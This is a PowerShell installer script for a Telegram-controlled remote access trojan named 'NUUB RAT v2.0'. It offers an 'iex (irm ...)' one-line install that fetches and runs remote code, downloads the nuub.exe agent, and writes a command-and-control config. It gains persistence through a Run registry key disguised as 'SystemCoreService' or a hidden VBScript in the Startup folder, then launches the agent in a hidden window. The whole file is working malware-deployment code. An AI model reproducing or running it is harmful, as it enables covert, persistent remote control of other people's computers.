# NUUB RAT v2.0 - Remote Installer
# One-line install: iex (irm https://github.com/TU_USUARIO/NUUB-VERSION-2/releases/latest/download/install.ps1)
#
# Parameters (optional, for silent/unattended install):
#   -Version      Release tag to download (default: "latest")
#   -Repo         GitHub repo in "owner/repo" format
#   -BotToken     Telegram bot token (skips step 1)
#   -AdminId      Telegram admin chat ID (skips step 2)
#   -PcId         PC identifier (default: "PC-001")
#   -EncPassword  Encryption password (generates random if empty)
#   -Heartbeat    Heartbeat interval in minutes (default: 30)
#   -InstallDir   Installation directory (default: %LOCALAPPDATA%\NuubRAT)
#   -AutoStart    Add to Windows startup automatically
#   -Silent       Run without prompts (requires -BotToken and -AdminId)

param(
    [string]$Version = "latest",
    [string]$Repo = "TU_USUARIO/NUUB-VERSION-2",
    [string]$BotToken = "",
    [string]$AdminId = "",
    [string]$PcId = "PC-001",
    [string]$EncPassword = "",
    [int]$Heartbeat = 30,
    [string]$InstallDir = "",
    [switch]$AutoStart,
    [switch]$Silent
)

$ErrorActionPreference = "Stop"

# ─── Banner ──────────────────────────────────────────────────────────────────

function Write-Banner {
    Write-Host ""
    Write-Host " _   _ _   _  ___ _____    ___  ___   _   _  _____" -ForegroundColor Cyan
    Write-Host "| | | | \ | |/ _ \_   _|  / _ \|_ _| \ | |/ / _ `" -ForegroundColor Cyan
    Write-Host "| | | |  \| | | | || |   | | | || ||  \| | | | |" -ForegroundColor Cyan
    Write-Host "| |_| | |\  | |_| || |   | |_| || || |\  | |_| |" -ForegroundColor Cyan
    Write-Host " \___/|_| \_|\___/ |_|    \___/___|_| \_|\___/" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "   Remote Installer v2.0" -ForegroundColor Yellow
    Write-Host ""
}

# ─── Helpers ─────────────────────────────────────────────────────────────────

function Read-Input {
    param(
        [string]$Prompt,
        [string]$Default = "",
        [switch]$Secret
    )

    if ($Default) {
        $display = "$Prompt [$Default]: "
    } else {
        $display = "$Prompt: "
    }

    if ($Secret) {
        $secure = Read-Host $display -AsSecureString
        $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure)
        $value = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
        [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($BSTR)
    } else {
        $value = Read-Host $display
    }

    if (-not $value -and $Default) { return $Default }
    return $value
}

function Read-YesNo {
    param(
        [string]$Prompt,
        [bool]$Default = $false
    )

    if ($Default) { $def = "Y/n" } else { $def = "y/N" }
    $value = Read-Host "$Prompt ($def)"
    if (-not $value) { return $Default }
    return ($value -eq 'y' -or $value -eq 'yes')
}

function Read-Number {
    param(
        [string]$Prompt,
        [int]$Default = 30
    )
    $value = Read-Host "$Prompt [$Default]"
    if (-not $value) { return $Default }
    $num = 0
    if ([int]::TryParse($value, [ref]$num)) { return $num }
    return $Default
}

function New-RandomString {
    param([int]$Length = 16)
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    return -join ((0..$Length) | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] })
}

function Write-Step {
    param([string]$Step, [string]$Title)
    Write-Host "`n$('=' * 55)" -ForegroundColor Cyan
    Write-Host "[$Step] $Title" -ForegroundColor Cyan
    Write-Host "$('=' * 55)" -ForegroundColor Cyan
}

function Write-OK { param([string]$Msg) Write-Host "[OK] $Msg" -ForegroundColor Green }
function Write-Err { param([string]$Msg) Write-Host "[ERROR] $Msg" -ForegroundColor Red }
function Write-Warn { param([string]$Msg) Write-Host "[WARN] $Msg" -ForegroundColor Yellow }
function Write-Info { param([string]$Msg) Write-Host "[INFO] $Msg" -ForegroundColor DarkYellow }

# ─── Prerequisites Check ─────────────────────────────────────────────────────

function Test-Prerequisites {
    Write-Step "0/6" "Checking Prerequisites"

    # Windows version
    $osVersion = [System.Environment]::OSVersion.Version
    if ($osVersion.Major -lt 10) {
        Write-Err "Windows 10 or higher is required (found: $($osVersion.Major).$($osVersion.Minor))"
        exit 1
    }
    Write-OK "Windows $($osVersion.Major).$($osVersion.Minor) detected"

    # PowerShell version
    if ($PSVersionTable.PSVersion.Major -lt 5) {
        Write-Err "PowerShell 5.1 or higher is required (found: $($PSVersionTable.PSVersion))"
        exit 1
    }
    Write-OK "PowerShell $($PSVersionTable.PSVersion) detected"

    # TLS 1.2 for GitHub
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Write-OK "TLS 1.2 enabled"

    return $true
}

# ─── Download Binary ─────────────────────────────────────────────────────────

function Get-NuubBinary {
    param(
        [string]$TargetDir
    )

    Write-Step "1/6" "Downloading NUUB RAT"

    # Determine download URL
    if ($Version -eq "latest") {
        $releaseUrl = "https://api.github.com/repos/$Repo/releases/latest"
        try {
            $release = Invoke-RestMethod -Uri $releaseUrl -UseBasicParsing
            $tagName = $release.tag_name
            Write-Info "Latest release: $tagName"

            # Find nuub.exe asset
            $asset = $release.assets | Where-Object { $_.name -eq "nuub.exe" } | Select-Object -First 1
            if (-not $asset) {
                # Fallback: look for zip containing nuub.exe
                $zipAsset = $release.assets | Where-Object { $_.name -like "*.zip" } | Select-Object -First 1
                if ($zipAsset) {
                    $downloadUrl = $zipAsset.browser_download_url
                } else {
                    Write-Err "No nuub.exe or .zip found in release $tagName"
                    Write-Info "Available assets: $($release.assets.name -join ', ')"
                    exit 1
                }
            } else {
                $downloadUrl = $asset.browser_download_url
            }
        } catch {
            Write-Err "Failed to fetch release info from GitHub: $_"
            Write-Info "Falling back to direct URL pattern..."
            $downloadUrl = "https://github.com/$Repo/releases/latest/download/nuub.exe"
        }
    } else {
        $downloadUrl = "https://github.com/$Repo/releases/download/$Version/nuub.exe"
    }

    # Create target directory
    if (-not (Test-Path $TargetDir)) {
        New-Item -ItemType Directory -Path $TargetDir -Force | Out-Null
    }

    $exePath = Join-Path $TargetDir "nuub.exe"

    # Download
    Write-Info "Downloading from: $downloadUrl"
    try {
        $ProgressPreference = 'SilentlyContinue'  # Speed up Invoke-WebRequest
        Invoke-WebRequest -Uri $downloadUrl -OutFile $exePath -UseBasicParsing
        $ProgressPreference = 'Continue'
    } catch {
        Write-Err "Download failed: $_"
        exit 1
    }

    if (-not (Test-Path $exePath)) {
        Write-Err "Downloaded file not found at $exePath"
        exit 1
    }

    $size = (Get-Item $exePath).Length / 1MB
    Write-OK "Downloaded nuub.exe ($([math]::Round($size, 2)) MB) to $TargetDir"

    return $exePath
}

# ─── Configuration Wizard ────────────────────────────────────────────────────

function Invoke-ConfigurationWizard {
    param(
        [string]$ConfigPath,
        [string]$Token,
        [string]$Admin,
        [string]$PcIdentifier,
        [string]$Password,
        [int]$HeartbeatInterval,
        [bool]$IsSilent
    )

    if ($IsSilent) {
        Write-Step "2/6" "Silent Mode - Using provided parameters"
        $botToken = $Token
        $adminIds = @($Admin)
        $pcId = $PcIdentifier
        $encPassword = $Password
        $heartbeat = $HeartbeatInterval

        if (-not $botToken) {
            Write-Err "Silent mode requires -BotToken"
            exit 1
        }
        if (-not $adminIds[0]) {
            Write-Err "Silent mode requires -AdminId"
            exit 1
        }
        if (-not $encPassword) {
            $encPassword = New-RandomString 16
        }

        Write-OK "Bot Token: $($botToken.Substring(0, [Math]::Min(10, $botToken.Length)))..."
        Write-OK "Admin ID: $($adminIds[0])"
        Write-OK "PC ID: $pcId"
    } else {
        # Interactive wizard
        Write-Step "2/6" "Telegram Bot Configuration"
        Write-Host "Create a bot via @BotFather on Telegram and get your token.`n"

        if ($Token) {
            $botToken = $Token
            Write-Info "Using provided token: $($botToken.Substring(0, [Math]::Min(10, $botToken.Length)))..."
        } else {
            $botToken = Read-Input "Bot Token" -Secret
        }
        if (-not $botToken) {
            Write-Err "Bot token is required!"
            exit 1
        }

        # Admin IDs
        Write-Step "3/6" "Admin Configuration"
        Write-Host "Send /start to your bot and note your chat ID.`n"

        $adminIds = @()
        if ($Admin) {
            $adminIds += $Admin
            Write-Info "Using provided admin ID: $Admin"
        } else {
            $firstId = Read-Input "Admin Chat ID"
            if ($firstId) { $adminIds += $firstId }

            while (Read-YesNo "Add another admin?") {
                $id = Read-Input "Admin Chat ID"
                if ($id) { $adminIds += $id }
            }
        }

        if ($adminIds.Count -eq 0) {
            Write-Err "At least one admin ID is required!"
            exit 1
        }

        # PC Identifier
        Write-Step "4/6" "PC Configuration"
        $pcId = Read-Input "PC Identifier" $PcIdentifier

        # Encryption Password
        Write-Step "5/6" "Security Configuration"
        if ($Password) {
            $encPassword = $Password
            Write-Info "Using provided encryption password"
        } else {
            $encPassword = Read-Input "Encryption Password (leave empty for random)" -Secret
            if (-not $encPassword) {
                $encPassword = New-RandomString 16
                Write-Host "Generated random password: $encPassword" -ForegroundColor Green
            }
        }

        # Heartbeat
        $heartbeat = Read-Number "Heartbeat interval (minutes)" $HeartbeatInterval
    }

    # Step 6: Advanced
    Write-Step "6/6" "Advanced Configuration"

    if (-not $IsSilent) {
        $useC2 = Read-YesNo "Enable C2 traffic encryption?" $false
        $c2Key = ""
        if ($useC2) {
            $c2Key = Read-Input "C2 Encryption Key" -Secret
            if (-not $c2Key) {
                $c2Key = New-RandomString 32
                Write-Host "Generated random C2 key: $c2Key" -ForegroundColor Green
            }
        }
    } else {
        $c2Key = ""
    }

    # Generate config.json
    $config = @{
        telegram_bot_token = $botToken
        admin_chat_id = [long]$adminIds[0]
        admin_chat_ids = $adminIds | ForEach-Object { [long]$_ }
        pc_identifier = $pcId
        encryption_password = $encPassword
        master_log_filename = "log_master.txt"
        activity_log_filename = "activity_log.csv"
        auto_start_entry_name = "SystemCoreService"
        log_filename = "nuub.log"
        heartbeat_interval_minutes = $heartbeat
        c2_encryption_key = $c2Key
    }

    $config | ConvertTo-Json | Out-File -FilePath $ConfigPath -Encoding UTF8
    Write-OK "Configuration saved to $ConfigPath"

    # Summary
    Write-Host "`n$('=' * 55)" -ForegroundColor Cyan
    Write-Host "CONFIGURATION SUMMARY" -ForegroundColor Green
    Write-Host "$('=' * 55)" -ForegroundColor Cyan
    Write-Host "  Bot Token:   $($botToken.Substring(0, [Math]::Min(10, $botToken.Length)))..."
    Write-Host "  Admin IDs:   $($adminIds -join ', ')"
    Write-Host "  PC ID:       $pcId"
    Write-Host "  C2 Encrypt:  $(if ($c2Key) {'Enabled'} else {'Disabled'})"
    Write-Host "  Heartbeat:   $heartbeat minutes"
}

# ─── Persistence ─────────────────────────────────────────────────────────────

function Set-Persistence {
    param(
        [string]$ExePath,
        [bool]$Auto
    )

    if ($Auto) {
        $install = $true
    } else {
        $install = Read-YesNo "`nAdd to Windows startup (auto-start on login)?" $false
    }

    if (-not $install) { return }

    # Method 1: Registry Run key (most reliable)
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $regName = "SystemCoreService"
        $regValue = "`"$ExePath`""
        Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
        Write-OK "Added to registry auto-start: $regName"
    } catch {
        Write-Warn "Registry method failed: $_"

        # Method 2: Startup folder fallback
        try {
            $startupPath = [Environment]::GetFolderPath('Startup')
            $dest = Join-Path $startupPath "nuub.vbs"

            # Use VBScript to run hidden
            $vbs = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"`"$ExePath`"`", 0, False"
            $vbs | Out-File -FilePath $dest -Encoding ASCII
            Write-OK "Added to startup folder: $dest"
        } catch {
            Write-Warn "Startup folder method also failed: $_"
        }
    }
}

# ─── Start Agent ─────────────────────────────────────────────────────────────

function Start-NuubAgent {
    param([string]$ExePath)

    $run = Read-YesNo "`nStart NUUB RAT now?" $true
    if (-not $run) {
        Write-Host "`nTo start manually: `"$ExePath`"" -ForegroundColor Yellow
        return
    }

    Write-Info "Starting NUUB RAT..."
    Start-Process -FilePath $ExePath -WindowStyle Hidden
    Write-OK "Agent started in background"
}

# ═══════════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════════

Clear-Host
Write-Banner

# Resolve install directory
if (-not $InstallDir) {
    $InstallDir = Join-Path $env:LOCALAPPDATA "NuubRAT"
}

# Check prerequisites
Test-Prerequisites

# Download binary
$exePath = Get-NuubBinary -TargetDir $InstallDir

# Configure
$configPath = Join-Path $InstallDir "config.json"
Invoke-ConfigurationWizard `
    -ConfigPath $configPath `
    -Token $BotToken `
    -Admin $AdminId `
    -PcIdentifier $PcId `
    -Password $EncPassword `
    -HeartbeatInterval $Heartbeat `
    -IsSilent $Silent

# Persistence
Set-Persistence -ExePath $exePath -Auto $AutoStart

# Start
Start-NuubAgent -ExePath $exePath

# Final message
Write-Host "`n$('=' * 55)" -ForegroundColor Cyan
Write-Host "INSTALLATION COMPLETE" -ForegroundColor Green
Write-Host "$('=' * 55)" -ForegroundColor Cyan
Write-Host "`n  Location:  $InstallDir"
Write-Host "  Config:    $configPath"
Write-Host "  Binary:    $exePath"
Write-Host "`n  Send /start to your bot to verify connection."
Write-Host ""
